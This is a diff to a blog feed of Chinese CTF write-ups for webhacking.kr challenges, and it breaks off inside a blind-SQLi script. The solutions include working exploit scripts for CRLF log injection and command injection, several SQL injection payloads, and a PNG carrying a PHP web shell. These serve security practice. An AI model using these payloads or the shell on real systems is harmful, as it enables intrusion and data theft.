+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-9/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>页面源码注释暴露了 <code>admin.php</code>。提交 <code>id</code>
+后，日志查看器会记录客户端地址和输入值，并要求日志行中的身份为
+<code>admin</code>。表单输入不能直接携带换行，但 POST body 可以传递 CRLF
+序列。将 CRLF 写入 <code>id</code>
+后，日志解析器会把后续内容视为新行。</p>
+<h3 id="solution">Solution</h3>
+<p>以下完整脚本在 <code>id</code> 中插入 CRLF，并随后读取题目提供的
+<code>admin.php</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Test the old-38 CRLF log payload&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--client-ip&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--base&quot;</span>, default=<span class="string">&quot;https://webhacking.kr&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_url = args.base.rstrip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/challenge/bonus-9/&quot;</span></span><br><span class="line">    admin_url = login_url + <span class="string">&quot;admin.php&quot;</span></span><br><span class="line">    forged_line = <span class="string">f&quot;guest\r\n<span class="subst">&#123;args.client_ip&#125;</span>:admin&quot;</span></span><br><span class="line"></span><br><span class="line">    response = session.post(login_url, data=&#123;<span class="string">&quot;id&quot;</span>: forged_line&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;login: <span class="subst">&#123;response.status_code&#125;</span> <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    admin_response = session.get(admin_url, timeout=<span class="number">20</span>)</span><br><span class="line">    admin_response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(admin_response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>原始 payload 的字面结构为：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">guest\r\n&lt;client-ip&gt;:admin</span><br></pre></td></tr></table></figure>
+<p><code>&lt;client-ip&gt;</code>
+必须替换为当前题目页面显示的客户端地址，不能使用任意地址。<code>admin.php</code>
+应在日志地址与当前客户端地址匹配时返回题目结果。</p>
+<p>CRLF 可以插入日志行；<code>admin.php</code>
+只在日志地址与当前客户端地址匹配时返回结果。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>crlf-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-41</title>
+    <url>/wp/webhacking/old-41/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Use the upload path and filename behavior to read the flag.</p>
+<p>利用上传路径和文件名处理读取 flag。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-19/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>题目接受 multipart
+文件上传，并把上传文件放入返回的随机目录。普通文件名 <code>123</code>
+也会被保存，随后可以直接按返回目录访问该文件。文件内容并不是关键，关键是上传后的路径可读，题目在该读取响应中直接给出
+flag。</p>
+<h3 id="solution">Solution</h3>
+<p>下面是最小可运行 Python
+请求脚本；它上传一个临时普通文件并读取题目返回的路径：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">session: requests.Session, challenge_url: <span class="built_in">str</span>, filename: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    data = <span class="string">b&quot;webhacking-old-41\n&quot;</span></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>: (filename, data, <span class="string">&quot;application/octet-stream&quot;</span>)&#125;</span><br><span class="line">    response = session.post(challenge_url, files=files, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The challenge returns a path containing the upload directory. Keep the</span></span><br><span class="line">    <span class="comment"># extraction conservative and fail instead of guessing a path.</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&quot;(?:/challenge/web-19/)?([0-9a-f]&#123;40&#125;)/&quot;</span> + re.escape(filename), response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;upload directory was not found in the response&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> urljoin(challenge_url, <span class="keyword">match</span>.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--url&quot;</span>, default=<span class="string">&quot;https://webhacking.kr/challenge/web-19/&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--filename&quot;</span>, default=<span class="string">&quot;123&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--cookie&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;optional session cookie; do not put it in the article&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="keyword">if</span> args.cookie:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(<span class="string">&quot;session-cookie&quot;</span>, args.cookie, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    uploaded_url = upload(session, args.url, args.filename)</span><br><span class="line">    response = session.get(uploaded_url, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>脚本通过 <code>multipart/form-data</code> 上传字段
+<code>file</code>，从响应中提取 40 位十六进制随机目录，再 GET 该目录下的
+<code>123</code>。</p>
+<p>脚本依赖题目响应仍以 40 位十六进制目录返回路径；读取响应中的 flag
+即可得到题目答案。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>linux</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>file-upload</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-43 RevengE</title>
+    <url>/wp/webhacking/old-43-revenge/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Upload a file accepted by Imagick while preserving a PHP-capable
+filename.</p>
+<p>上传一个能被 Imagick 接受、同时保留 PHP 文件名的文件。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://webhacking.kr:10018/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>服务端检查上传文件的 MIME type，拒绝 <code>text/*</code> 和
+<code>application/octet-stream</code>，随后用 Imagick
+读取、缩放并以原文件名写入 <code>upload/</code>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();</span><br><span class="line"><span class="variable">$image</span>-&gt;<span class="title function_ invoke__">readImage</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="variable">$image</span>-&gt;<span class="title function_ invoke__">resizeImage</span>(<span class="number">500</span>, <span class="number">500</span>, imagick::<span class="variable constant_">FILTER_GAUSSIAN</span>, <span class="number">10</span>);</span><br><span class="line"><span class="variable">$image</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="string">&#x27;./upload/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>文件名没有限制 <code>.php</code> 后缀。一个有效 PNG 可以在
+<code>tEXt</code> chunk 中携带 PHP 代码；若 Imagick 在目标部署中保留该
+metadata，上传结果就会以 <code>.php</code> 文件名保存，并由 PHP
+解释器处理。</p>
+<h3 id="solution">Solution</h3>
+<p><code>PHP</code> 代码放入 <code>Comment</code> 文本块：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">PHP = <span class="string">b&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunk</span>(<span class="params">kind, data</span>):</span><br><span class="line">    body = kind + data</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;I&quot;</span>, <span class="built_in">len</span>(data)) + body + struct.pack(<span class="string">&quot;&gt;I&quot;</span>, zlib.crc32(body) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_png</span>(<span class="params">path</span>):</span><br><span class="line">    signature = <span class="string">b&quot;\x89PNG\r\n\x1a\n&quot;</span></span><br><span class="line">    ihdr = struct.pack(<span class="string">&quot;&gt;IIBBBBB&quot;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    scanline = <span class="string">b&quot;\x00\xff\xff\xff&quot;</span></span><br><span class="line">    text = <span class="string">b&quot;Comment\x00&quot;</span> + PHP</span><br><span class="line">    png = <span class="string">b&quot;&quot;</span>.join(</span><br><span class="line">        (</span><br><span class="line">            signature,</span><br><span class="line">            chunk(<span class="string">b&quot;IHDR&quot;</span>, ihdr),</span><br><span class="line">            chunk(<span class="string">b&quot;tEXt&quot;</span>, text),</span><br><span class="line">            chunk(<span class="string">b&quot;IDAT&quot;</span>, zlib.compress(scanline)),</span><br><span class="line">            chunk(<span class="string">b&quot;IEND&quot;</span>, <span class="string">b&quot;&quot;</span>),</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    Path(path).write_bytes(png)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    make_png(<span class="string">&quot;shell.png&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>上传生成的 <code>shell.png</code> 时，multipart 字段如下：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">name=file</span><br><span class="line">filename=shell.php</span><br><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure>
+<p>上传后访问：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/upload/shell.php?cmd=cat%20%2Fflag</span><br></pre></td></tr></table></figure>
+<p>metadata 是否在缩放和写入后保留，取决于目标 Imagick
+版本与部署配置。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>file-upload</tag>
+        <tag>imagick</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-44</title>
+    <url>/wp/webhacking/old-44/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Execute <code>ls</code> through a five-character POST field.</p>
+<p>在五字符 POST 字段中执行 <code>ls</code>。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://webhacking.kr:10005/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>服务端只保留 <code>id</code> 的前五个字符，再拼入：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;hello! <span class="subst">&#123;$id&#125;</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>输入 <code>';ls'</code> 的前五个字符仍是 <code>';ls'</code>。shell
+先结束原来的单引号字符串，再执行
+<code>ls</code>；最后一个单引号重新闭合外层命令字符串。这样可以从目录列表得到当前
+flag 文件名。</p>
+<h3 id="solution">Solution</h3>
+<p>提交 POST 字段：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">id=&#x27;;ls&#x27;</span><br></pre></td></tr></table></figure>
+<p>命令输出返回一个以 <code>flag_</code>
+开头的文件名。不要把部署生成的完整文件名写死；脚本应从当前响应中提取它：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flag_&lt;deployment-generated-name&gt;</span><br></pre></td></tr></table></figure>
+<p>随后访问该文件读取 flag：</p>
+<p>完整验证脚本如下。它只请求题目端口，不包含 cookie
+或其他凭据；如果部署响应格式改变，脚本会明确失败而不会猜文件名。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">FLAG_FILE = re.<span class="built_in">compile</span>(<span class="string">r&quot;flag_[0-9a-f]+&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--url&quot;</span>, default=<span class="string">&quot;http://webhacking.kr:10005/&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    response = requests.post(args.url, data=&#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;&#x27;;ls&#x27;&quot;</span>&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">match</span> = FLAG_FILE.search(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;flag filename was not found in the command output&quot;</span>)</span><br><span class="line"></span><br><span class="line">    flag_url = urljoin(args.url, <span class="keyword">match</span>.group(<span class="number">0</span>))</span><br><span class="line">    flag_response = requests.get(flag_url, timeout=<span class="number">20</span>)</span><br><span class="line">    flag_response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(flag_response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>command-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-49</title>
+    <url>/wp/webhacking/old-49/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Return admin through a heavily filtered numeric SQL expression.</p>
+<p>通过严格过滤的数值 SQL 表达式返回 admin。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-24/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p><code>lv</code> 被当作 SQL
+表达式使用。当前题目的过滤会拒绝括号、空白字符、引号以及
+<code>or</code>、<code>and</code> 等关键字，但没有同时拒绝 MySQL 的
+<code>||</code> 和十六进制字符串字面量。</p>
+<p><code>100||id=0x61646d696e</code>
+的两部分分别是一个数值表达式和一个条件表达式。MySQL 中 <code>||</code>
+可作为逻辑 OR 使用，<code>0x61646d696e</code> 会按字符串解释为
+<code>admin</code>，所以当记录的 <code>id</code> 为 <code>admin</code>
+时，条件为真并可被页面选中。</p>
+<h3 id="solution">Solution</h3>
+<p>向 old-49 的 challenge URL 发送以下完整请求：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-24/?lv=100%7C%7Cid%3D0x61646d696e</span><br></pre></td></tr></table></figure>
+<p>未编码显示时，<code>lv</code> 的原始值是：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">100||id=0x61646d696e</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-50</title>
+    <url>/wp/webhacking/old-50/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Use the encoding boundary to reach a UNION result with level 3.</p>
+<p>利用编码边界注入 UNION 结果，使 level 变成 3。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-25/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>old-50 的 <code>id</code> 会先经过 <code>addslashes</code>，之后再从
+EUC-KR 转换为 UTF-8。<code>%aa</code>
+是多字节字符的前导字节；在该转换边界下，它可以吞掉
+<code>addslashes</code> 插入的反斜杠，使后面的单引号重新成为 SQL
+语法的一部分。</p>
+<p><code>pw</code> 从注释结束处开始注入
+<code>UNION SELECT 3</code>。Tab（<code>%09</code>）代替空格，<code>#</code>（<code>%23</code>）注释掉后续
+SQL。这个链依赖原始请求中的字节顺序，浏览器或 HTTP
+客户端不能把已经编码的
+<code>%aa</code>、<code>%27</code>、<code>%2f</code>、<code>%2a</code>
+再编码成字面量百分号序列。</p>
+<h3 id="solution">Solution</h3>
+<p>候选请求的完整原始 query 为：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-25/?id=%aa%27%2f%2a&amp;pw=%2a%2funion%09select%093%23</span><br></pre></td></tr></table></figure>
+<p>解码后两个参数分别是：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">id=\xaa&#x27;/*</span><br><span class="line">pw=*/union\tselect\t3#</span><br></pre></td></tr></table></figure>
+<p>其中 <code>\xaa</code> 表示原始字节
+<code>0xaa</code>，不是六个普通字符。需要使用 Burp Repeater 或能保留
+query 原始字节的客户端重放请求，不要先把整个 URL
+当作普通参数再次编码。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+        <tag>encoding</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-51</title>
+    <url>/wp/webhacking/old-51/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Bypass the raw-MD5 SQL query on the admin page.</p>
+<p>绕过 admin page 中的 raw-MD5 SQL 查询。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-13/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>题目给出的关键服务端逻辑是：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$input_pw</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(</span><br><span class="line">        <span class="variable">$db</span>,</span><br><span class="line">        <span class="string">&quot;select id from chall51 where id=&#x27;<span class="subst">&#123;$input_id&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$input_pw&#125;</span>&#x27;&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>PHP 的 <code>md5</code> 第二个参数为 <code>true</code> 时返回 16
+字节原始二进制，而不是通常看到的 32 位十六进制文本。提交的密码
+<code>129581926211651571912466741651878684928</code> 的 MD5
+原始结果已在本地核对为：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">repr: b&quot;\\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8&quot;</span><br></pre></td></tr></table></figure>
+<p>结果中包含 <code>'or'</code>。拼进单引号包围的 <code>pw</code>
+值后，SQL 片段会形成字符串比较与 <code>or</code>
+条件，后面的非空字符串条件为真，从而绕过密码相等性检查。<code>id=admin</code>
+选择目标记录。</p>
+<h3 id="solution">Solution</h3>
+<p>向 <code>/challenge/bonus-13/</code> 发送完整的 form-urlencoded
+请求：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://webhacking.kr/challenge/bonus-13/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \</span><br><span class="line">  --data <span class="string">&#x27;id=admin&amp;pw=129581926211651571912466741651878684928&#x27;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+        <tag>md5</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-53</title>
+    <url>/wp/webhacking/old-53/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Discover the hidden table name through
+<code>procedure analyse()</code>.</p>
+<p>通过 <code>procedure analyse()</code> 泄露隐藏表名。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-28/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>题目的相关 PHP 逻辑是：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;answer&#x27;</span>] == <span class="variable">$hidden_table</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">solve</span>(<span class="number">53</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|by/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;val&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(</span><br><span class="line">        <span class="variable">$db</span>,</span><br><span class="line">        <span class="string">&quot;select a from <span class="subst">$hidden_table</span> where a=<span class="subst">&#123;$_GET[&#x27;val&#x27;]&#125;</span>&quot;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+<p><code>answer</code> 需要等于隐藏表名，而 <code>val</code>
+会进入查询。MySQL 的 <code>procedure analyse()</code>
+可以从当前结果列的元数据输出
+<code>database.table.column</code>。因此先用
+<code>val=1 procedure analyse()</code> 观察输出，再从三段结果中取中间的
+table 名。</p>
+<h3 id="solution">Solution</h3>
+<p>发现表名的完整请求是：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-28/?val=1%20procedure%20analyse()</span><br></pre></td></tr></table></figure>
+<p>响应返回三段式的 <code>database.table.column</code> 结果：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;database&gt;.&lt;hidden-table&gt;.&lt;column&gt;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-55</title>
+    <url>/wp/webhacking/old-55/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Extract the flag from the ranking query.</p>
+<p>通过排行榜查询提取 flag。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-31/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p><code>rank.php</code> 将 <code>score</code>
+拼入查询，并根据查询结果显示两个可区分的排名行。先把结果限制到第三列，再调用
+<code>procedure analyse()</code>，可以得到保存 flag 的列名：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/challenge/web-31/rank.php?score=2147483647%20limit%202,1%20procedure%20analyse()</span><br></pre></td></tr></table></figure>
+<p>当前部署返回的列名是：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">p4ssw0rd_1123581321</span><br></pre></td></tr></table></figure>
+<p>接着把 <code>score</code> 设为条件表达式。条件为真时选择已知分数
+<code>1</code> 的行，条件为假时选择 <code>2</code>
+的行；页面中的两行内容就是 boolean oracle。<code>substr</code>
+在当前过滤下不可用，所以用 <code>left</code>。候选前缀转成十六进制后放入
+<code>LIKE 0x&lt;hex-prefix&gt;</code>，既避免引号，也避免候选字符串被重新解释。</p>
+<h3 id="solution">Solution</h3>
+<p>单次字符探测的完整请求模板是：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-31/rank.php?score=1%20and%20left(p4ssw0rd_1123581321%2CN)%20like%200x&lt;hex-prefix&gt;</span><br></pre></td></tr></table></figure>
+<p>其中 <code>N</code> 是当前前缀长度，<code>&lt;hex-prefix&gt;</code>
+是 <code>FLAG{</code> 加上已恢复字符的 ASCII 十六进制，例如首个前缀
+<code>FLAG{F</code> 应使用：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">464c414746</span><br></pre></td></tr></table></figure>
+<p>上面的示意值中不能混用全角字符；实际 ASCII 十六进制应写成：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">464c41477b46</span><br></pre></td></tr></table></figure>
+<p>以下脚本包含列名、候选字符集、请求、oracle
+判断和逐字符循环，可直接复现该盲注算法。运行时用环境变量提供自己的
+session cookie，不要把真实 cookie 写进文章或脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(<span class="string">&quot;WEBHACKING_BASE&quot;</span>, <span class="string">&quot;https://webhacking.kr&quot;</span>)</span><br><span class="line">ENDPOINT = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/challenge/web-31/rank.php&quot;</span></span><br><span class="line">SESSION_ID = os.environ.get(<span class="string">&quot;CHALLENGE_SESSION&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">COLUMN = <span class="string">&quot;p4ssw0rd_1123581321&quot;</span></span><br><span class="line">TRUE_MARKER = <span class="string">&quot;Piterpan&quot;</span></span><br><span class="line">MAX_LENGTH = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LIKE 的十六进制前缀不需要引号；% 不放入候选集，避免它成为 LIKE 通配符。</span></span><br><span class="line">CHARACTERS = (</span><br><span class="line">    string.ascii_letters</span><br><span class="line">    + string.digits</span><br><span class="line">    + <span class="string">&quot;!\\\&quot;#$&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 